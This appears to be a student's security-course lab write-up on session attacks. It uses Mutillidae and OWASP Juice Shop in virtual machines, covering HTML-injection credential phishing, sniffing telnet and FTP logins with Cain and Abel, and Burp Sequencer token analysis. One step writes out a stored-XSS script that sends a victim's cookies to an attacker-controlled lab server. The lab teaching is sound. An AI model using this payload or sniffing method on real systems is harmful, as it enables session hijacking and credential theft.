# Web Security
## Session Attacks

### Lab Requirements
- Internet connectivity & VMware Workstation version 15.5.7 or above.
- Windows Server 2016 VM and Kali Linux VM prepared with necessary software.

### Lab Overview
This LAB is centered around understanding and mitigating session attacks, with an emphasis on practical experience in capturing user data, employing tools like Cain and Abel, and understanding session token entropy using Burp Suite's Sequencer tool.

### Lab Tasks and Screenshots

### Capture User Data
**Task**: Inject HTML to prompt a user to re-enter their login credentials, capturing these credentials.
- **Steps**:
    1. On Kali Linux, navigate to Mutillidae's home page, disable hints, reset the database, and create a new user with username `FOLusername` and password `FOObar`.
    2. Log in as that user, navigate to a specific documentation page, and find necessary HTML in Mutillidae-Test-Scripts.txt file.
    3. Submit the HTML to the blog, and then type in the credentials you created for the user `FOLusername` and submit.
    4. View the results on the "View Captured Data" page.
- **Slide 01**: Screenshot showing the captured username and password data.
    <img src="https://i.imgur.com/cpqdtyg.png" height="400px" width="auto" alt="Capture User Data"/>

### Cain and Abel
**Task**: Install and use Cain and Abel for capturing credentials.
- **Steps**:
    1. On Ubuntu, install the telnet daemon and ensure telnet and FTP services are running.
    2. On Kali Linux, log into the telnet server and issue commands.
    3. Capture the successful telnet login & logout.
- **Slide 02**: Screenshot showing the successful telnet login & logout.
    <img src="https://i.imgur.com/SrCC2eA.png" height="400px" width="auto" alt="Cain and Abel"/>


**Objective**: Install and configure Cain and Abel on Windows 10 VM for capturing credentials.
- **Steps**:
    1. **Installation**:
        - Download and extract `WinPcap_4_1_3.7z` using the password `info6076`.
        - Run `WinPcap_4_1_3.exe` accepting default installation options.
        - Download `Cain and Abel (ca_setup.7z)` and extract its contents using the password `info6076`.
        - Run `ca_setup.exe` as an administrator and follow through installation, opting not to install WinPcap since it's already done.
    2. **Network Configuration**:
        - Adjust the network adapter settings on the INFO6076 LAN Segment to ensure Cain & Abel functions correctly:
            - Disable "Large Send Offload (IPv4)" under the advanced tab.
            - Check DNS settings under Internet Protocol Version 4 (TCP/IPv4) properties.
    3. **Cain and Abel Configuration**:
        - Open Cain and Abel and configure the sniffer to start on startup.
        - Verify the settings are activated (indicated by toggled switches).
        - Navigate to the Sniffer tab and set up for capturing passwords.
    4. **Capture Process**:
        - Initiate a telnet connection to Ubuntu Server from Kali Linux and observe Cain and Abel capturing the session.
        - Once connected and then disconnected, verify the captured session in Cain and Abel.
        - Use Windows PowerShell to issue `net config workstation` and capture the command's output.

- **Slide 03**: Screenshot showing the successful session capture and related details in Cain and Abel.

<img src="https://i.imgur.com/f70s0ms.png" height="400px" width="auto" alt="Cain and Abel"/>

### Cain and Abel with FileZilla
**Task**: Use Cain and Abel to capture FTP credentials.
- **Steps**:
    1. On Kali Linux, download and open FileZilla, and log into an FTP server running on Ubuntu.
    2. On Windows 10, use Cain and Abel to capture the FTP username and password being used by the victim on Kali Linux.
- **Slide 04**: Screenshot showing the capture of FTP credentials.
    <img src="https://i.imgur.com/BZZz5gr.png" height="400px" width="auto" alt="Cain and Abel with FileZilla"/>

### Burp Suite Sequencer
**Task**: Test the entropy of session tokens created by Mutillidae using Burp Suite's Sequencer.
- **Steps**:
    1. On Kali Linux, reset the database in Mutillidae and clear all existing cookies in the browser.
    2. Navigate to the DNS page in Mutillidae and capture the Requests and Responses.
    3. Send the relevant packet to Sequencer and start live capture, analyzing session tokens.
- **Slide 05**: Screenshot showing the Sequencer analysis results.
    <img src="https://i.imgur.com/nr2T2qY.png" height="400px" width="auto" alt="Burp Suite Sequencer"/>

### Sending Cookie Information to Attacker

**Objective**: Demonstrate capturing and redirecting session cookies to an attacker-controlled server using a crafted Perl script.

**Steps**:
1. **Setup Perl Script**: Download `logit.pl` onto Kali Linux into `/var/cgi-bin/`. Rename, change ownership to `www-data`, and set appropriate permissions.
2. **Configure Apache2**: Ensure Apache2 can serve CGI scripts. Update Apache configuration to execute `logit.pl`.
3. **Prepare Attack Vector**: On Windows 10 VM, navigate to Mutillidae and create user accounts. Log in as 'Hacker' on Kali and as victim on Windows 10.
4. **Inject Script**: On Kali, use the 'Add to your blog' page in Mutillidae to inject `<script>document.location="http://folusername-kali/cgi-bin/logit.pl?"+document.cookie</script>`.
5. **Capture Data**: As the victim navigates the blog, the script redirects them, capturing and logging their session cookies to the attacker's server.

**Expected Outcome**:
- The session cookies of the victim are captured and logged by the `logit.pl` script on the attacker's server, demonstrating the vulnerability of insecure session handling.

**Slide 06**: Provide a screenshot demonstrating the successful capture and logging of session cookies due to the script injection.

html
<img src="https://i.imgur.com/oSensua.png" height="400px" width="auto" alt="Sending Cookie Information"/>


### OWASP Juice Shop Challenge
**Task**: Access a hidden page in the OWASP Juice Shop using forced browsing.
- **Steps**:
    1. Turn on the required VMs, navigate to the OWASP Juice Shop login page on Kali Linux, and then to the customer feedback page.
    2. Use forced browsing to identify AJAX call options for resource requests and navigate to the hidden scoreboard page.
- **Slide 07**: Screenshot showing the successful solution in the browser.
    <img src="https://i.imgur.com/M3sdwU7.png" height="400px" width="auto" alt="OWASP Juice Shop Challenge"/>


**Conclusion**: This LAB provides hands-on experience with session attacks, emphasizing the importance of secure session management and robust web security practices.

